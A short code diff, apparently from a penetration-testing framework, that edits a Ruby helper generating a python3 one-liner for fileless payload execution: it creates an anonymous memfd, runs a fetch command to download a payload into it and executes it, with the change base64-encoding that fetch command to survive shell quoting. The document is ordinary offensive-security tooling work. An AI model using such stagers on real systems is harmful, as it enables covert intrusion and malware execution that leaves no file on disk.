@@ -303,8 +303,13 @@ def _generate_fileless_shell(get_file_cmd, arch)
 end
   
   # same idea as _generate_fileless function, but force creating anonymous file handle
+  #
+  # get_file_cmd is base64-encoded and decoded again inside the python one-liner, since it
+  # can contain shell metacharacters (e.g. the arch/endian query string) that would otherwise
+  # break out of the single-quoted `python3 -c '...'` argument it's embedded in.
   def _generate_fileless_python(get_file_cmd)
-    %Q<python3 -c 'import os;fd=os.memfd_create("",os.MFD_CLOEXEC);os.system(f"f=\\"/proc/{os.getpid()}/fd/{fd}\\";#{get_file_cmd};$f&")'> 
+    encoded_get_file_cmd = Base64.strict_encode64(get_file_cmd)
+    %Q<python3 -c 'import os,base64;fd=os.memfd_create("",os.MFD_CLOEXEC);get_file_cmd=base64.b64decode("#{encoded_get_file_cmd}").decode();os.system(f"f=\\"/proc/{os.getpid()}/fd/{fd}\\";{get_file_cmd};$f&")'>
   end
   
    # The idea behind fileless execution are anonymous files. The bash script will search through all processes owned by $USER and search from all file descriptor. If it will find anonymous file (contains "memfd") with correct permissions (rwx), it will copy the payload into that descriptor with defined fetch command and finally call that descriptor
